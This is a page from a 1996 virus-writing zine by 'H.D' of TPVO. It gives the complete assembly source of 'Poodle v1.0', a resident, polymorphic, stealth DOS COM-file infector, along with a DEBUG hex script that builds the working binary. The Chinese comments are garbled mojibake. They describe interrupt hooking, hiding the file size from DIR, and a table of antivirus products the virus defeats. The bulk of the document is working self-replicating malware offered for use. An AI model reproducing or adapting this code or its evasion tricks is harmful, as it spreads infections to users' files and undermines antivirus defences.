
                                                                     P.009

         TpVOtPVoTpvOTpVOtpVoTPvOTPVOtpVOTPvOtPVOtPVOtPvOTPvOTpVoTPVO
         PT                                                        OT
         VP     ¥x ÆW «Â ¤O ¯f ¬r ²Õ Â´   ¯f¬rÂø»x   ²Ä ‘C ´Á      TP
         oV                                                        PV
         TO                Ææ Poodle v1.0 ¯f¬r  Ææ                 Vo
         pT                                                        OT
         VP                        by H.D.                         VP
         OV                                                        OV
         OVTPVoTpvOtPvoTPVOtPvoTpVotpvoTpVotpvOtPvoTpVOtpvOTPvOTpvOTP


        ==============================================================       

; ¶Ù!¦U¦ìªB¤Í¦n!
;    ³o°¦¬r¬O§ÚÆZ¤[¥H«e¼gªº¡A³Ìªñ¬Ý¨ì®³¥X¨Ó¦A§ï¤@§ï¡C¼g±o¦³¨ÇÂ²­®¡A¤£¹L
;    ÁÙ«j±j¥i¥H¥Î°Õ..
; -------------------------------------------------------------------------
;    ¯f¬r¦WºÙ: Poodle
;    ª©    ¥»: 1.0
;    ªø    «×: 1414 bytes
;    ·P¬V±ø¥ó: ¤j©ó 4100 byte ¤p©ó 63000 byte ªº com ÀÉ
;    µo§@±¡§Î: ¨C¦~ 11 ¤ë´Á¶¡°õ¦æ±a¬rÀÉ®×¨q¥X°T®§¥B©Úµ´°õ¦æ (µL¯}Ãa©Ê)
;    ¨ä    ¥¦: ¦@¦³ 6 ²Õ½s½X¡A»¡¦o¦h§Îºâ«j±j(connie 1.0 ¨º«¬)
;              Äd int 13h, int 15h, int 21h, int 2ah ¤¤Â_
;              dir ®É·|ÁôÂÃ¤j¤p
; -------------------------------------------------------------------------
; ³o°¦¬r¼g±o«ÜÂ²³æ¡AÀ³¸Ó«Ü®e©ö¬ÝÀ´¡A¸Ì­±¦³¤@¨Ç°l¶i¤JÂIªº¤p§Þ¥©¡A·Q¾Çªº¤H
; ¥i¥H¬Ý¬Ý¡CÁÙ¦³¡A³o°¦¬r­Y¦b§Aªº¹q¸£¤W·|·í¡A¨º¥i¯à¬O¸Ñ½X®Éµo¥Íªº¦î¦C°ÝÃD
; ¦b§Úªº¹q¸£¤W¬O¨S°ÝÃD¡A­Y¦b§Aªº¹q¸£·|·í¨º¥i¯à´N¬O³o­Ó­ì¦]¤F..
; -------------------------------------------------------------------------
; ¹ï©ó¨¾¬r§Ú¸Õ¤F¥|ºØ¡Aµ²ªG¦p¤U¡G
;
; ¢z¢w¢w¢w¢w¢w¢s¢w¢w¢w¢w¢w¢w¢w¢w¢w¢s¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢{
; ¢x ¨¾¬r¦WºÙ ¢x ª©            ¥» ¢x     ´ú      ¸Õ      µ²      ªG       ¢x
; ¢u¢w¢w¢w¢w¢w¢q¢w¢w¢w¢w¢w¢w¢w¢w¢w¢q¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢t
; ¢x ZLOCK    ¢x J4.61 '95 PW40 ª©¢x¤£ºÞ¤@¯ë©Î¨¾¼g¼Ò¦¡¤UÄdºI²v¬ù¶È¤T¦¨¥ª¥k¢x
; ¢u¢w¢w¢w¢w¢w¢q¢w¢w¢w¢w¢w¢w¢w¢w¢w¢q¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢t
; ¢x PCCILLIN ¢x v5.0 ª©          ¢xPCC_DEV.SYS ¸ü¤J¤U·|·í±¼¡F¤£¸ü¤J³Q¬ð¯}¢x
; ¢u¢w¢w¢w¢w¢w¢q¢w¢w¢w¢w¢w¢w¢w¢w¢w¢q¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢t
; ¢x TPLUS    ¢x v0.97a ª©        ¢x¥i¦¨¥\¨¾¿m                            ¢x
; ¢u¢w¢w¢w¢w¢w¢q¢w¢w¢w¢w¢w¢w¢w¢w¢w¢q¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢t
; ¢x VSAFE    ¢x DOS v6.22 ª©     ¢x¥\¯à & ¨¾¼g¥þ¶}¤´³Q¬ð¯}               ¢x
; ¢|¢w¢w¢w¢w¢w¢r¢w¢w¢w¢w¢w¢w¢w¢w¢w¢r¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢}
; -------------------------------------------------------------------------
;                                           Written By [H.D] at TPVO 1996.2
; -------------------------------------------------------------------------
      .model tiny
      .code

      org 100h

start:
      db 0bbh,00,00                   ;©w°¾²¾­È..

      mov ax,'WL'                     ;¬Ý¬Ý¦³¨S¦³¦P¦ñ¤w±`¾n¤F..
      int 21h

      cmp ax,'HO'
      jnz inst_vir                    ;¨S¦³´N±`¾n¥h....
      
      mov ah,2ah                      ;¨ú¤é´Á
      int 21h
      
      cmp dh,0bh                      ;¬O¤£¬O 11 ¤ë°Ú...
      jnz exit_vir
      
      mov ah,09h                      ;Show Mark ¥X¨Ó..
      mov dx,offset vir_msg
      add dx,bx
      int 21h      
      int 20h

inst_vir:
      mov ax,cs:[0016h]               ;¨ú¤÷µ{¦¡ªº¬q¦ì§} ..
      mov cs:[cmmd_addr+bx],ax
   
      push es                         ;©ñ¨ì 9000:0100 ¸Ì ..
      mov ax,9000h
      mov es,ax
      mov si,offset start
      add si,bx
      mov di,0100h
      mov cx,vir_size
      rep
      movsb
      pop es

      pushf
      db 9ah
      dw offset vir_tsr 
      db 00h,90h

exit_vir:
      mov si,0100h                    ;°õ¦æ­ì¨Óªºµ{¦¡ ..
      mov di,offset buffer_02
      add di,bx
      mov ax,cs:[di]
      mov cs:[si],ax
      mov ah,cs:[di+2]
      mov cs:[si+2],ah
      jmp si

vir_tsr:
      push bx

      push ds     

      xor ax,ax
      mov ds,ax

      mov ax,offset trace_oint13      ;¨ú­ì©l 13h ¤¤Â_ ..
      mov bl,13h
      call int_1                      ;±Ò°Ê³æ¨B ..

      mov ax,offset trace_oint15      ;¨ú 15h ¤¤Â_ («D­ì©l) ..
      mov bl,15h
      call int_1                      ;±Ò°Ê³æ¨B ..

      pop ds

      call get_oint21                 ;¨ú­ì©l 21h ¤¤Â_ ..
      call set_oint21                 ;¦b Int 21h ¸Ì´¡®Úªá ..

      pop bx
      iret     
;----------------------------------------------------------------------------
int_1:                                ;³æ¨B·j¯Á ..
      cli
      mov word ptr ds:[0004],ax
      mov word ptr ds:[0006],cs
      sti

      mov ah,35h
      mov al,bl
      int 21h

      call open_flag_T

      pushf
      push cs
      mov ax,offset j_03
      push ax

      mov ax,0ffffh

      push es  ; \
      push bx  ;  |=== int xxh
      retf     ; /
j_03:
      call close_flag_T
      mov byte ptr cs:[trace_flag],0
      ret
;----------------------------------------------------------------------------
trace_oint13:                         ;§ä Int 13h ªº­ì©l¶i¤JÂI ..
      push ax
      push bp

      cmp byte ptr cs:[trace_flag],1
      jz j_04

      mov bp,sp
      mov ax,[bp+6]
      cmp ax,0f000h
      jnz j_04

      mov cs:[oint13_h],ax
      mov ax,[bp+4]
      mov cs:[oint13_l],ax
      mov byte ptr cs:[trace_flag],1
j_04:
      pop bp
      pop ax
      iret
;----------------------------------------------------------------------------
trace_oint15:                         ;§ä Int 15h ªº¶i¤JÂI ..
      push ax
      push bp
      cmp byte ptr cs:[trace_flag],1
      jz j_24

      mov bp,sp
      mov ax,ss:[bp+6]
      cmp ax,cs:[cmmd_addr]
      jnb j_24

      mov cs:[oint15_h],ax
      mov ax,[bp+4]
      mov cs:[oint15_l],ax
      mov byte ptr cs:[trace_flag],1
j_24:
      pop bp
      pop ax
      iret
;--------------------------------------------------------------------------
open_flag_T:                          ;¶}±Ò³æ¨BºX¼Ð ..
      pushf
      pop ax
      or ah,00000011b
      push ax
      popf
      ret

close_flag_T:
      pushf                           ;Ãö³¬³æ¨BºX¼Ð ..
      pop ax
      and ah,11111110b
      push ax
      popf
      ret
;---------------------------------------------------------------------------
get_oint21:                           ;¨ú int 21h ­ì©l¶i¤JÂI ..
      mov si,0006h                    ;¨Ï¥Î PSP 6-9 Byte ªº¦ì§} ..
      lds bx,[si]
      mov si,bx
      lds bx,[si+1]
      cmp word ptr [bx+06h],2effh     ;Int 21h ¦b°ª¼h°O¾ÐÅé¶Ü?
      jnz j_05
      mov bx,[bx+08h]
      lds bx,[bx]
j_05:
      mov cx,0035h
      add bx,cx
j_06:
      inc bx
      cmp word ptr [bx],8e2eh
      jnz j_07
      mov ax,bx
j_07:
      loop j_06
      mov cs:[oint21_l],ax
      mov cs:[oint21_h],ds
      mov bx,ax
      mov ax,[bx+3]
      mov cs:[i21_x],ax
      ret
;----------------------------------------------------------------------------
set_oint21:                         ;®tªáªº°Æµ{¦¡ ..
      push cs
      pop ds
      mov bx,[oint21_l]
      mov ax,[oint21_h]
      add bl,05
      mov [int21_l],bx
      mov [int21_h],ax
      mov bx,[oint21_l]
      mov ds,ax
      mov ax,offset vir_int21

      cli
      mov [bx+1],ax
      mov [bx+3],9000h
      mov byte ptr [bx],0eah
      sti

      ret
;-----------------------------------------------------------------------
vir_int21:                            ;int 21h ªº isr...
      pop ax
      push ax
      cmp ax,'WL'                     ;¦P¦ñ©I¥s¶Ü?
      jz say_yes                      ;»¡§Ú¦bÅo..
      cmp ax,4b00h                    ;Run µ{¦¡¶Ü?
      jz infect_file                  ;¬O´N¶Ç¬V¥hÅo ..
      cmp ah,11h                      ;dir ?! ÁY¤pÅo ..
      jz stealth
      cmp ah,12h
      jz stealth
      jmp exit_vir_int21
;---------------------------------------------------------------------------
stealth:
      jmp dir_stealth
;-----------------------------
say_yes:
      mov ax,'HO'                     ;©M¦P¦ñ»¡ "HellO"
      add sp,12h
      iret
;-----------------------------
infect_file:
      push ax
      push bx
      push cx
      push dx
      push ds
      push di
      push si

      mov ax,3d02h
      call oint21
      mov cs:[file_handle],ax

      mov bx,ax                       ;¬Ý¬Ý¶Ç¬V¹L¨S...
      mov ax,5700h
      call oint21

      mov cs:[file_time],cx
      mov cs:[file_date],dx
      and cl,00011111b
      cmp cl,00000001b
      jz j_08                         ;Ëç..¶Ç¬V¹L°Õ...¨º´Nºâ¤F...

      mov bx,cs:[file_handle]
      push cs
      pop ds
      mov dx,offset buffer_02
      mov cx,0003
      mov ah,3fh
      call oint21

      cmp word ptr cs:[buffer_02],'ZM';¬O EXE ÀÉ..¼È®É¤£¶Ç¬V...
      jnz infect_it

j_08:
      mov bx,cs:[file_handle]
      mov ah,3eh
      call oint21

      pop si
      pop di
      pop ds
      pop dx
      pop cx
      pop bx
      pop ax

      jmp exit_vir_int21

infect_it:
      mov ax,4202h                    ;¶Ç¬VÅo!!!
      mov bx,cs:[file_handle]
      xor cx,cx
      mov dx,cx
      call oint21

      mov cs:[file_size],ax

      cmp ax,4100                     ;¤j©ó 4100 Bytes ¶Ü?
      jb j_08                         ;¤Ó¤p?!¦³¶B ..

      cmp ax,63000
      jnb j_08

      add ax,0ch
      mov word ptr cs:[start+1],ax    ;³]°¾²¾­È ..
;-------------------------------------------------------
       add ax,0f4h
       push ax
       push ax
;-------------------------------------------------------
       mov di,1000h                   ;¿ï¾Ü¸Ñ½X«ü¦ì¼È¦s¾¹ ..
r_0:
       in al,40h                      ;¨ú­Ó¶Ã¼Æ
       and al,00000011b

       cmp al,0
       jnz r_1

       mov bl,00000100b               ;si
r_1:
       cmp al,1
       jnz r_2

       mov bl,00000101b               ;di
r_2:
       cmp al,2
       jnz r_3

       mov bl,00000111b               ;bx
r_3:
       cmp al,3
       jnz r_0
;----------------------------------------------------------------------------
m_sek:                                ; mov reg,xxxx
       cmp bl,00000100b ;si
       jnz m_1
       mov ah,0beh
m_1:
       cmp bl,00000101b ;di
       jnz m_2
       mov ah,0bfh
m_2:
       cmp bl,00000111b ;bx
       jnz m_3
       mov ah,0bbh
m_3:
       mov ds:[di],ah
       pop cx
       add cx,0ch
       mov ds:[di+1],cx
       add di,3
;---------------------------------------------------------------------------
       call xx_0                      ;³]©w¸Ñ½X«ü¥O©M½s½X ..
       jmp l_add
xx_0:
       in al,40h
       and al,00000111b

       cmp al,0                       ;inc byte ptr [reg]
       jnz xx_1
       mov byte ptr cs:[uncmd],0feh
       mov word ptr cs:[how_do],0ccfeh
       xor ah,ah
       call do_it
       ret
xx_1:
       cmp al,1                       ;dec byte ptr [reg]
       jnz xx_2     
       mov byte ptr cs:[uncmd],0feh
       mov word ptr cs:[how_do],0c4feh
       mov ah,00001000b     
       call do_it
       ret
xx_2:
       cmp al,2                       ;not byte ptr [reg]
       jnz xx_3
       mov byte ptr cs:[uncmd],0f6h
       mov word ptr cs:[how_do],0d4f6h
       mov ah,00010000b   
       call do_it
       ret
xx_3:
       cmp al,3                       ;neg byte ptr [reg]
       jnz xx_4
       mov byte ptr cs:[uncmd],0f6h
       mov word ptr cs:[how_do],0dcf6h
       mov ah,00011000b  
       call do_it
       ret
xx_4:
       cmp al,4                       ;ror byte ptr [reg]
       jnz xx_5
       mov byte ptr cs:[uncmd],0d0h
       mov word ptr cs:[how_do],0c4d0h
       mov ah,00001000b  
       call do_it
       ret
xx_5:
       cmp al,5                       ;rol byte ptr [reg]
       jnz xx_0
       mov byte ptr cs:[uncmd],0d0h
       mov word ptr cs:[how_do],0ccd0h
       xor ah,ah
       call do_it
       ret
;----------------------------------------------------------------------------
do_it:                                ;½s½X ..
       or ah,bl
       db 3eh,0c6h,05h                ;mov byte ptr [di],??
uncmd  db 00h
       mov ds:[di+1],ah
       inc di
       inc di

       push si
       push di
       push ax

       mov si,0100h
       mov di,100ch
       mov cx,vir_size
cc_inc:
       mov ah,cs:[si]
how_do dw ?       
       mov cs:[di],ah
       inc di
       inc si
       loop cc_inc

       pop ax
       pop di
       pop si
       ret
;----------------------------------------------------------------------------
l_add:                                ;¥[¤W»¼¼W«ü¥O
       xor ax,ax

       in al,40h
       and al,00000011b
       mov si,ax

       cmp bl,00000100b ;si
       jnz l_1
       mov ah,cs:[add_si+si]
       jmp short l_3
l_1:
       cmp bl,00000101b ;di
       jnz l_2
       mov ah,cs:[add_di+si]
       jmp short l_3
l_2:
       mov ah,43h
l_3:
       mov ds:[di],ah
       inc di
;----------------------------------------------------------------------------
c_cmp:                                ;¥[¤W¤ñ¸û«ü¥O ..
       cmp bl,00000111b
       jnz c_1

       mov bl,00000011b
c_1:
       or bl,00000010b

       mov ah,11111000b
       or ah,bl

       mov byte ptr ds:[di],81h
       mov ds:[di+1],ah

       pop cx
       add cx,vir_size+100h

       mov ds:[di+2],cx
       add di,4

       in al,40h
       and al,00000001b

       cmp al,0                       ;jb xx
       jnz cc_1
       mov word ptr ds:[di],0f772h
cc_1:
       cmp al,1                       ;jnz xx
       jnz cc_2
       mov word ptr ds:[di],0f775h
cc_2:
       inc di
       inc di
;-----------------------------------------------------------------------
      mov ax,4000h                    ;¼g¤JÀÉ®× ..
      mov bx,cs:[file_handle]
      push cs
      pop ds
      mov dx,1000h
      mov cx,vir_size+0ch
      call oint21

      mov ax,4200h
      mov bx,cs:[file_handle]
      xor cx,cx
      mov dx,cx
      call oint21

      mov byte ptr cs:[buffer_01],0e9h ;³]¶i¤JÂI ..
      mov ax,cs:[file_size]
      sub ax,3
      mov word ptr cs:[buffer_01+1],ax

      mov ax,4000h
      mov bx,cs:[file_handle]
      push cs
      pop ds
      mov dx,offset buffer_01
      mov cx,3
      call oint21

      mov ax,5701h                    ;»\­Ó¼Ð°O ..
      mov bx,cs:[file_handle]
      mov cx,cs:[file_time]
      mov dx,cs:[file_date]
      and cl,11100001b       
      or cl,01h    
      call oint21

      jmp j_08

exit_vir_int21:
      add sp,12h
      cli
      jmp j_09
;-----------------------------------------------------------------------------
oint21:                               ;­ì©l int 21h ©I¥sµ{¦¡ ..
      cli
      call protect                    ;¤É¨¾Å@ ..
      mov cs:[buffer_00],ax
      mov ax,offset j_10
      pushf
      push cs
      push ax
      mov ax,cs:[buffer_00]
j_09:
      push es
      push ds
      push bp
      push di
      push si
      push dx
      push cx
      push bx
      push ax
      push ds
      mov ax,cs:[oint21_h]
      mov ds,ax
      pop ax
      db 3eh,8eh,1eh                  ; mov ds,ds:[xxxx]
i21_x dw ?
      jmp dword ptr cs:[int21_l]
j_10:
      call unprotect                  ; ºM¨¾Å@ ..
      sti
      ret
;---------------------------------------------------------------------------
dir_stealth:                          ; dir ÁôÂÃ¤j¤p ..
      call oint21

      cmp al,0ffh
      jz dir_exit

      push ax
      push bx
      push es

      mov ah,2fh
      call oint21
      cmp byte ptr es:[bx],0ffh       ;ÂX®i¦¡ FCB ¶Ü?!
      jnz dir_handle
      add bx,0007h
dir_handle:
      mov ah,es:[bx+17h]
      and ah,00011111b
      cmp ah,00000001b
      jnz dir_ok
      sub word ptr es:[bx+1dh],vir_size+0ch  ;´îªÎ¤@¤U...

dir_ok:
      pop es
      pop bx
      pop ax

dir_exit:
      add sp,12h
      iret
;--------------------------------------------------------------------------
protect:                              ;¤É°_¨¾Å@ºô !
      push ax
      push bx
      push ds

      xor ax,ax
      mov ds,ax

      mov ax,offset j_11              ;§â int 2ah ´«±¼ ..
      mov bx,cs
      xchg ax,ds:[2ah*4]
      xchg bx,ds:[2ah*4+2]
      mov cs:[int2a_l],ax
      mov cs:[int2a_h],bx

      mov ax,cs:[oint13_l]            ;§â int 13h ´«±¼ ..
      mov bx,cs:[oint13_h]
      xchg ax,ds:[13h*4]
      xchg bx,ds:[13h*4+2]
      mov cs:[int13_l],ax
      mov cs:[int13_h],bx

      mov ax,cs:[oint15_l]            ;§â int 15h ´«±¼ ..
      mov bx,cs:[oint15_h]
      xchg ax,ds:[15h*4]
      xchg bx,ds:[15h*4+2]
      mov cs:[int15_l],ax
      mov cs:[int15_h],bx

      mov ax,0070h                    ;§â dos ¤º³¡ int 13h ´«±¼ ..
      mov ds,ax
      mov ax,cs:[oint13_l]
      mov bx,cs:[oint13_h]
      mov ds:[104h],ax
      mov ds:[106h+2],bx   
      xchg ax,ds:[0b4h]
      xchg bx,ds:[0b4h+2]
      mov cs:[dos_int13_l],ax
      mov cs:[dos_int13_h],bx

      pop ds
      pop bx
      pop ax
      ret
;----------------------------------------------------------------------------
unprotect:                            ;ºM°£¨¾Å@ºô !
      int 28h                         ;call int 28h ¥s§Ö¨úµ{¦¡»°§Ö§â¸ê®Æ¼g¤J !
      int 28h
      int 28h
      int 28h
      int 28h

      push ax
      push bx
      push ds

      xor ax,ax
      mov ds,ax

      mov ax,cs:[int2a_l]             ;ÁÙ­ì int 2ah
      mov bx,cs:[int2a_h]
      mov ds:[2ah*4],ax
      mov ds:[2ah*4+2],bx

      mov ax,cs:[int13_l]             ;ÁÙ­ì int 13h
      mov bx,cs:[int13_h]
      mov ds:[13h*4],ax
      mov ds:[13h*4+2],bx

      mov ax,cs:[int15_l]             ;ÁÙ­ì int 15h
      mov bx,cs:[int15_h]
      mov ds:[15h*4],ax
      mov ds:[15h*4+2],bx

      mov ax,0070h                    ;ÁÙ­ì dos ¤º³¡ int 13h ..
      mov ds,ax
      mov ax,cs:[dos_int13_l]
      mov bx,cs:[dos_int13_h]
      mov ds:[106h],ax
      mov ds:[106h+2],bx   
      mov ds:[0b4h],ax
      mov ds:[0b4h+2],bx

      pop ds
      pop bx
      pop ax

      ret
;---------------------------------------------------------------------------
j_11:
      iret
;-----------------------------------------------------------------------
vir_msg db 'This is [Poodle v1.0] Virus !!!',0dh,0ah
        db '   Written By [H.D] at TPVO.',0dh,0ah,'$'
;-----------------------------------------------------------------------
int13_l dw ?
int13_h dw ?
int15_l dw ?
int15_h dw ?
int21_l dw ?
int21_h dw ?
int2a_l dw ?
int2a_h dw ?
;-----------------------------------------------------------------------
oint13_l dw ?
oint13_h dw ?
oint15_l dw ?
oint15_h dw ?
oint21_l dw ?
oint21_h dw ?
;-----------------------------------------------------------------------
vir_size equ offset vir_end-offset start
file_handle dw ?
trace_flag db ?
cmmd_addr dw ?       
file_time dw ?
file_date dw ?
file_size dw ?
buffer_00 dw ?
buffer_01 db 3 dup(?)
buffer_02 db 90h,0cdh,20h
dos_int13_l dw ?
dos_int13_h dw ?
add_si db 46h,0ach,0a6h,0ach
add_di db 47h,0aeh,0a6h,0aeh
vir_end:
      end start
=============================================================================
 N POODLE.COM
 E 0100 BB 00 00 B8 4C 57 CD 21 3D 4F 48 75 14 B4 2A CD
 E 0110 21 80 FE 0B 75 2E B4 09 BA 0B 06 03 D3 CD 21 CD
 E 0120 20 2E A1 16 00 2E 89 87 6A 06 06 B8 00 90 8E C0
 E 0130 BE 00 01 03 F3 BF 00 01 B9 8A 05 F3 A4 07 9C 9A
 E 0140 5C 01 00 90 BE 00 01 BF 77 06 03 FB 2E 8B 05 2E
 E 0150 89 04 2E 8A 65 02 2E 88 64 02 FF E6 53 1E 33 C0
 E 0160 8E D8 B8 A3 01 B3 13 E8 11 00 B8 CB 01 B3 15 E8
 E 0170 09 00 1F E8 8F 00 E8 C5 00 5B CF FA A3 04 00 8C
 E 0180 0E 06 00 FB B4 35 8A C3 CD 21 E8 68 00 9C 0E B8
 E 0190 99 01 50 B8 FF FF 06 53 CB E8 61 00 2E C6 06 69
 E 01A0 06 00 C3 50 55 2E 80 3E 69 06 01 74 1B 8B EC 8B
 E 01B0 46 06 3D 00 F0 75 11 2E A3 5D 06 8B 46 04 2E A3
 E 01C0 5B 06 2E C6 06 69 06 01 5D 58 CF 50 55 2E 80 3E
 E 01D0 69 06 01 74 1D 8B EC 8B 46 06 2E 3B 06 6A 06 73
 E 01E0 11 2E A3 61 06 8B 46 04 2E A3 5F 06 2E C6 06 69
 E 01F0 06 01 5D 58 CF 9C 58 80 CC 03 50 9D C3 9C 58 80
 E 0200 E4 FE 50 9D C3 BE 06 00 C5 1C 8B F3 C5 5C 01 81
 E 0210 7F 06 FF 2E 75 05 8B 5F 08 C5 1F B9 35 00 03 D9
 E 0220 43 81 3F 2E 8E 75 02 8B C3 E2 F5 2E A3 63 06 2E
 E 0230 8C 1E 65 06 8B D8 8B 47 03 2E A3 F1 04 C3 0E 1F
 E 0240 8B 1E 63 06 A1 65 06 80 C3 05 89 1E 53 06 A3 55
 E 0250 06 8B 1E 63 06 8E D8 B8 68 02 FA 89 47 01 C7 47
 E 0260 03 00 90 C6 07 EA FB C3 58 50 3D 4C 57 74 15 3D
 E 0270 00 4B 74 17 80 FC 11 74 08 80 FC 12 74 03 E9 44
 E 0280 02 E9 79 02 B8 4F 48 83 C4 12 CF 50 53 51 52 1E
 E 0290 57 56 B8 02 3D E8 33 02 2E A3 67 06 8B D8 B8 00
 E 02A0 57 E8 27 02 2E 89 0E 6C 06 2E 89 16 6E 06 80 E1
 E 02B0 1F 80 F9 01 74 1B 2E 8B 1E 67 06 0E 1F BA 77 06
 E 02C0 B9 03 00 B4 3F E8 03 02 2E 81 3E 77 06 4D 5A 75
 E 02D0 14 2E 8B 1E 67 06 B4 3E E8 F0 01 5E 5F 1F 5A 59
 E 02E0 5B 58 E9 E0 01 B8 02 42 2E 8B 1E 67 06 33 C9 8B
 E 02F0 D1 E8 D7 01 2E A3 70 06 3D 04 10 72 D4 3D 18 F6
 E 0300 73 CF 05 0C 00 2E A3 01 01 05 F4 00 50 50 BF 00
 E 0310 10 E4 40 24 03 3C 00 75 02 B3 04 3C 01 75 02 B3
 E 0320 05 3C 02 75 02 B3 07 3C 03 75 E6 80 FB 04 75 02
 E 0330 B4 BE 80 FB 05 75 02 B4 BF 80 FB 07 75 02 B4 BB
 E 0340 88 25 59 83 C1 0C 89 4D 01 83 C7 03 E8 03 00 E9
 E 0350 B5 00 E4 40 24 07 3C 00 75 13 2E C6 06 E5 03 FE
 E 0360 2E C7 06 FA 03 FE CC 32 E4 E8 74 00 C3 3C 01 75
 E 0370 13 2E C6 06 E5 03 FE 2E C7 06 FA 03 FE C4 B4 08
 E 0380 E8 5D 00 C3 3C 02 75 13 2E C6 06 E5 03 F6 2E C7
 E 0390 06 FA 03 F6 D4 B4 10 E8 46 00 C3 3C 03 75 13 2E
 E 03A0 C6 06 E5 03 F6 2E C7 06 FA 03 F6 DC B4 18 E8 2F
 E 03B0 00 C3 3C 04 75 13 2E C6 06 E5 03 D0 2E C7 06 FA
 E 03C0 03 D0 C4 B4 08 E8 18 00 C3 3C 05 75 85 2E C6 06
 E 03D0 E5 03 D0 2E C7 06 FA 03 D0 CC 32 E4 E8 01 00 C3
 E 03E0 0A E3 3E C6 05 00 88 65 01 47 47 56 57 50 BE 00
 E 03F0 01 BF 0C 10 B9 8A 05 2E 8A 24 00 00 2E 88 25 47
 E 0400 46 E2 F4 58 5F 5E C3 33 C0 E4 40 24 03 8B F0 80
 E 0410 FB 04 75 07 2E 8A A4 7E 06 EB 0E 80 FB 05 75 07
 E 0420 2E 8A A4 82 06 EB 02 B4 43 88 25 47 80 FB 07 75
 E 0430 02 B3 03 80 CB 02 B4 F8 0A E3 C6 05 81 88 65 01
 E 0440 59 81 C1 8A 06 89 4D 02 83 C7 04 E4 40 24 01 3C
 E 0450 00 75 04 C7 05 72 F7 3C 01 75 04 C7 05 75 F7 47
 E 0460 47 B8 00 40 2E 8B 1E 67 06 0E 1F BA 00 10 B9 96
 E 0470 05 E8 57 00 B8 00 42 2E 8B 1E 67 06 33 C9 8B D1
 E 0480 E8 48 00 2E C6 06 74 06 E9 2E A1 70 06 2D 03 00
 E 0490 2E A3 75 06 B8 00 40 2E 8B 1E 67 06 0E 1F BA 74
 E 04A0 06 B9 03 00 E8 24 00 B8 01 57 2E 8B 1E 67 06 2E
 E 04B0 8B 0E 6C 06 2E 8B 16 6E 06 80 E1 E1 80 C9 01 E8
 E 04C0 09 00 E9 0C FE 83 C4 12 FA EB 12 FA E8 5F 00 2E
 E 04D0 A3 72 06 B8 F8 04 9C 0E 50 2E A1 72 06 06 1E 55
 E 04E0 57 56 52 51 53 50 1E 2E A1 65 06 8E D8 58 3E 8E
 E 04F0 1E 00 00 2E FF 2E 53 06 E8 AE 00 FB C3 E8 CB FF
 E 0500 3C FF 74 26 50 53 06 B4 2F E8 BF FF 26 80 3F FF
 E 0510 75 03 83 C3 07 26 8A 67 17 80 E4 1F 80 FC 01 75
 E 0520 06 26 81 6F 1D 96 05 07 5B 58 83 C4 12 CF 50 53
 E 0530 1E 33 C0 8E D8 B8 0A 06 8C CB 87 06 A8 00 87 1E
 E 0540 AA 00 2E A3 57 06 2E 89 1E 59 06 2E A1 5B 06 2E
 E 0550 8B 1E 5D 06 87 06 4C 00 87 1E 4E 00 2E A3 4B 06
 E 0560 2E 89 1E 4D 06 2E A1 5F 06 2E 8B 1E 61 06 87 06
 E 0570 54 00 87 1E 56 00 2E A3 4F 06 2E 89 1E 51 06 B8
 E 0580 70 00 8E D8 2E A1 5B 06 2E 8B 1E 5D 06 A3 04 01
 E 0590 89 1E 08 01 87 06 B4 00 87 1E B6 00 2E A3 7A 06
 E 05A0 2E 89 1E 7C 06 1F 5B 58 C3 CD 28 CD 28 CD 28 CD
 E 05B0 28 CD 28 50 53 1E 33 C0 8E D8 2E A1 57 06 2E 8B
 E 05C0 1E 59 06 A3 A8 00 89 1E AA 00 2E A1 4B 06 2E 8B
 E 05D0 1E 4D 06 A3 4C 00 89 1E 4E 00 2E A1 4F 06 2E 8B
 E 05E0 1E 51 06 A3 54 00 89 1E 56 00 B8 70 00 8E D8 2E
 E 05F0 A1 7A 06 2E 8B 1E 7C 06 A3 06 01 89 1E 08 01 A3
 E 0600 B4 00 89 1E B6 00 1F 5B 58 C3 CF 54 68 69 73 20
 E 0610 69 73 20 5B 50 6F 6F 64 6C 65 20 76 31 2E 30 5D
 E 0620 20 56 69 72 75 73 20 21 21 21 0D 0A 20 20 20 57
 E 0630 72 69 74 74 65 6E 20 42 79 20 5B 48 2E 44 5D 20
 E 0640 61 74 20 54 50 56 4F 2E 0D 0A 24 00 00 00 00 00
 E 0650 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0660 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0670 00 00 00 00 00 00 00 90 CD 20 00 00 00 00 46 AC
 E 0680 A6 AC 47 AE A6 AE
 RCX
 0586
 W
 Q
